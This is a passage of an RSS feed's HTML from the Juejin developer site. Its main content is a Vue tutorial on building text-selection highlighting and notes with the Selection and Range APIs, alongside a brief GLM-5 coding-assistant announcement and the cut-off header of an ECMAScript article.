                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>百度文心快码今天全面支持GLM-5。作为面向复杂系统工程优化的新一代模型，GLM-5进一步强化了Coding Agent在真实研发场景中的持续执行能力。</p>
<p>基于GLM-5在推理能力、代码理解与任务规划方面的显著提升，文心快码在跨文件分析、问题修复、多步骤开发等复杂工程场景中实现了更高质量的任务执行，在开发过程中更高效完成从需求理解、任务拆解到结果交付的工程闭环，帮助开发者提升复杂任务处理效率与质量。</p>
<p>目前，Comate已在IDE及插件端全面集成GLM-5，深度赋能开发全流程。</p>
<p>诚邀大家即刻体验，反馈使用感受！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a59d4d90c0fe41e7aafa0839bcacda54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771555355&amp;x-signature=0ScjlavsBqfZDoCtMS4%2BNKcHpE0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 实战：从零实现“划词标注”与“高亮笔记”功能]]></title>    <link>https://juejin.cn/post/7605817795628531762</link>    <guid>https://juejin.cn/post/7605817795628531762</guid>    <pubDate>2026-02-13T02:42:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605817795628531762" data-draft-id="7605769126272057390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 实战：从零实现“划词标注”与“高亮笔记”功能"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-13T02:42:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="皮蛋小精灵"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 实战：从零实现“划词标注”与“高亮笔记”功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    皮蛋小精灵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:42:35.000Z" title="Fri Feb 13 2026 02:42:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在在线教育、文档阅读或博客系统中，<strong>划词标注（Highlight &amp; Note）</strong> 是一个非常实用的功能。它允许用户像在纸质书上一样，用鼠标选中一段文字，进行高亮标记或添加读书笔记。</p>
<p>本文将拆解如何在 Vue 项目中实现这一功能，涵盖从底层的 <code>Selection API</code> 调用到 DOM 操作，再到数据状态管理的完整流程。</p>
<hr/>
<h2 data-id="heading-0">核心原理</h2>
<p>实现划词标注的核心在于浏览器提供的 <strong>Selection API</strong> 和 <strong>Range API</strong>。</p>
<ol>
<li><strong>Selection</strong>: 代表用户当前选中的文本范围（可能跨越多个节点）。</li>
<li><strong>Range</strong>: 代表文档中一个连续的区域（Selection 通常包含一个 Range）。</li>
<li><strong>DOM 操作</strong>: 将选中的文本用一个特定样式的标签（如 <code>&lt;span&gt;</code>）包裹起来，从而实现高亮效果。</li>
</ol>
<hr/>
<h2 data-id="heading-1">Step 1: 监听选区 (Capture Selection)</h2>
<p>首先，我们需要在用户松开鼠标（<code>mouseup</code>）时捕获选区。</p>
<p><strong>HTML 结构</strong>：
在内容容器上绑定 <code>mouseup</code> 事件。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content-container"</span> @<span class="hljs-attr">mouseup</span>=<span class="hljs-string">"handleTextSelection"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 文章内容 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一段可以被选中的文本...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><strong>JavaScript 实现</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">handleTextSelection</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 延时保证选区状态已更新</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> selection = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();

    <span class="hljs-comment">// 1. 基础校验：必须是 Range 类型且非空</span>
    <span class="hljs-keyword">if</span> (selection.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>() === <span class="hljs-string">''</span> || selection.<span class="hljs-property">type</span> !== <span class="hljs-string">'Range'</span> || selection.<span class="hljs-property">isCollapsed</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuVisible</span> = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 隐藏菜单</span>
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 2. 获取核心 Range 对象</span>
    <span class="hljs-keyword">const</span> range = selection.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>);

    <span class="hljs-comment">// 3. (可选) 进阶校验：禁止跨特定区域选择</span>
    <span class="hljs-comment">// 比如：不能同时选中 A 选项和 B 选项</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCrossBlockSelection</span>(range)) {
      selection.<span class="hljs-title function_">removeAllRanges</span>();
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 4. 执行高亮包裹逻辑（见下文）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createTempHighlight</span>(range, selection);
  }, <span class="hljs-number">0</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-2">Step 2: 包裹文本 (Wrap Text)</h2>
<p>获取到 <code>Range</code> 后，我们需要将选中的文本用一个临时标签（Temp Span）包裹起来。这个标签通常有两个作用：</p>
<ol>
<li><strong>视觉反馈</strong>：给用户一个“预选中”的状态（例如浅蓝色背景）。</li>
<li><strong>定位锚点</strong>：用于计算后续“操作菜单”的显示位置。</li>
</ol>
<p><strong>核心代码</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">createTempHighlight</span>(<span class="hljs-params">range, selection</span>) {
  <span class="hljs-comment">// 创建一个包裹标签</span>
  <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'span'</span>);
  span.<span class="hljs-property">className</span> = <span class="hljs-string">'temp-selection-highlight'</span>; <span class="hljs-comment">// 自定义样式类</span>

  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 核心操作：提取内容 -&gt; 插入节点</span>
    <span class="hljs-comment">// range.extractContents() 会将选区内容从 DOM 树中移除并返回 DocumentFragment</span>
    span.<span class="hljs-title function_">appendChild</span>(range.<span class="hljs-title function_">extractContents</span>());
    <span class="hljs-comment">// 将包裹后的 span 插入回原处</span>
    range.<span class="hljs-title function_">insertNode</span>(span);

    <span class="hljs-comment">// ⚠️重要：重置选区</span>
    <span class="hljs-comment">// 因为 DOM 结构改变了，原有的 selection 会失效或错位</span>
    <span class="hljs-comment">// 我们需要重新选中这个 span 的内容，让用户感觉“高亮还在”</span>
    <span class="hljs-keyword">const</span> newRange = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createRange</span>();
    newRange.<span class="hljs-title function_">selectNodeContents</span>(span);
    selection.<span class="hljs-title function_">removeAllRanges</span>();
    selection.<span class="hljs-title function_">addRange</span>(newRange);

    <span class="hljs-comment">// 保存当前 Range 引用，供后续操作使用</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentRange</span> = newRange;

    <span class="hljs-comment">// 5. 显示操作菜单</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showActionMenu</span>(span);

  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Wrapping failed:'</span>, e);
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-3">Step 3: 菜单定位 (Positioning Menu)</h2>
<p>操作菜单（“高亮”、“笔记”）通常悬浮在选区上方。我们可以利用 <code>getBoundingClientRect()</code> 或 <code>getClientRects()</code> 来获取位置。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">showActionMenu</span>(<span class="hljs-params">spanElement</span>) {
  <span class="hljs-comment">// 获取元素的位置信息</span>
  <span class="hljs-comment">// getClientRects() 对于跨行文本更准确，取最后一行</span>
  <span class="hljs-keyword">const</span> rects = spanElement.<span class="hljs-title function_">getClientRects</span>();
  <span class="hljs-keyword">const</span> lastRect = rects.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? rects[rects.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] : spanElement.<span class="hljs-title function_">getBoundingClientRect</span>();

  <span class="hljs-comment">// 计算菜单坐标（相对于视口）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuPosition</span> = {
    <span class="hljs-attr">top</span>: (lastRect.<span class="hljs-property">bottom</span> + <span class="hljs-number">5</span>) + <span class="hljs-string">'px'</span>, <span class="hljs-comment">// 显示在下方 5px 处</span>
    <span class="hljs-attr">left</span>: (lastRect.<span class="hljs-property">right</span> + <span class="hljs-number">5</span>) + <span class="hljs-string">'px'</span>
  };

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuVisible</span> = <span class="hljs-literal">true</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-4">Step 4: 确认与状态管理 (Confirm &amp; State)</h2>
<p>用户点击菜单中的“高亮”或“笔记”按钮后，我们需要将临时的 <code>span</code> 转换为持久化的状态。</p>
<ol>
<li><strong>修改样式</strong>：将 <code>temp-selection-highlight</code> 类替换为 <code>permanent-highlight</code>（黄色）或 <code>note-highlight</code>（蓝色）。</li>
<li><strong>生成 ID</strong>：给 span 添加一个唯一 ID（如 <code>data-id="167..."</code>）。</li>
<li><strong>保存数据</strong>：将笔记内容推入 Vue 的数据数组中。</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">applyHighlight</span>(<span class="hljs-params">type</span>) {
  <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.temp-selection-highlight'</span>);
  <span class="hljs-keyword">if</span> (!span) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 1. 生成唯一 ID</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>();

  <span class="hljs-comment">// 2. 更新 DOM 类名和属性</span>
  span.<span class="hljs-property">className</span> = type === <span class="hljs-string">'note'</span> ? <span class="hljs-string">'note-highlight'</span> : <span class="hljs-string">'highlight-text'</span>;
  span.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-id'</span>, id);

  <span class="hljs-comment">// 3. 存入数据层</span>
  <span class="hljs-keyword">const</span> newNote = {
    id,
    <span class="hljs-attr">text</span>: span.<span class="hljs-property">innerText</span>, <span class="hljs-comment">// 选中的原文</span>
    type, <span class="hljs-comment">// 'highlight' or 'note'</span>
    <span class="hljs-attr">color</span>: type === <span class="hljs-string">'note'</span> ? <span class="hljs-string">'#e6f7ff'</span> : <span class="hljs-string">'#ffeb3b'</span>,
    <span class="hljs-attr">createTime</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
  };

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">notesList</span>.<span class="hljs-title function_">push</span>(newNote);

  <span class="hljs-comment">// 4. 持久化（保存到后端或 LocalStorage）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">saveData</span>();

  <span class="hljs-comment">// 5.如果是笔记，打开侧边栏供用户输入</span>
  <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'note'</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">openNoteSidebar</span>(id);
  }

  <span class="hljs-comment">// 清除选中状态</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>().<span class="hljs-title function_">removeAllRanges</span>();
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuVisible</span> = <span class="hljs-literal">false</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-5">Step 5: 取消高亮 (Unwrap)</h2>
<p>如果用户想删除高亮，我们需要执行“反向操作”：将 <code>span</code> 去掉，保留里面的文字。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">removeHighlight</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">`span[data-id="<span class="hljs-subst">${id}</span>"]`</span>);
  <span class="hljs-keyword">if</span> (span) {
    <span class="hljs-keyword">const</span> parent = span.<span class="hljs-property">parentNode</span>;
    <span class="hljs-comment">// 将 span 的子节点（文本）移动到父节点中 span 的前面</span>
    <span class="hljs-keyword">while</span> (span.<span class="hljs-property">firstChild</span>) {
      parent.<span class="hljs-title function_">insertBefore</span>(span.<span class="hljs-property">firstChild</span>, span);
    }
    <span class="hljs-comment">// 移除空 span</span>
    parent.<span class="hljs-title function_">removeChild</span>(span);
    <span class="hljs-comment">// 规范化节点，合并相邻的文本节点</span>
    parent.<span class="hljs-title function_">normalize</span>();
  }

  <span class="hljs-comment">// 同步删除数据</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">notesList</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">notesList</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n.<span class="hljs-property">id</span> !== id);
}
</code></pre>
<h2 data-id="heading-6">进阶技巧：从数据还原 DOM</h2>
<p>最大的难点在于：<strong>页面刷新后，如何重新渲染这些高亮？</strong></p>
<p>如果你的内容是纯静态的，可以直接保存包含 <code>span</code> 标签的 HTML 字符串。但由于 Vue 的 <code>v-html</code> 或 React 的 <code>dangerouslySetInnerHTML</code> 会导致 DOM 重绘，简单的 HTML 替换可能会丢失事件绑定。</p>
<p>更稳健的做法是：</p>
<ol>
<li>保存 <strong>选区路径</strong>（如：第 X 个段落，第 Y 个字符开始，长度 Z）。</li>
<li>页面加载时，遍历数据，利用 <code>createRange()</code> 重新定位并包裹 DOM。</li>
</ol>
<p>由于这通常涉及到复杂的 DOM 遍历算法，生产环境中推荐结合成熟库（如 <code>Rangy</code> 或自行实现基于 XPath 的定位）来处理复杂场景。</p>
<hr/>
<h2 data-id="heading-7">总结</h2>
<p>实现一个划词笔记功能，本质上是对 DOM Range 的灵活运用。通过 <strong>监听(Listen) -&gt; 包裹(Wrap) -&gt; 存储(Store) -&gt; 还原(Restore)</strong> 这四个步骤，我们就能为用户提供流畅的沉浸式阅读体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 ES2015 到 ES2025：你还跟得上吗]]></title>    <link>https://juejin.cn/post/7605625595570552847</link>    <guid>https://juejin.cn/post/7605625595570552847</guid>    <pubDate>2026-02-13T02:52:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570552847" data-draft-id="7531888107878006819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 ES2015 到 ES2025：你还跟得上吗"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-13T02:52:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="布列瑟农的星空"/> <meta itemprop="url" content="https://juejin.cn/user/976022056218471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 ES2015 到 ES2025：你还跟得上吗
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022056218471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    布列瑟农的星空
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:52:06.000Z" title="Fri Feb 13 2026 02:52:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
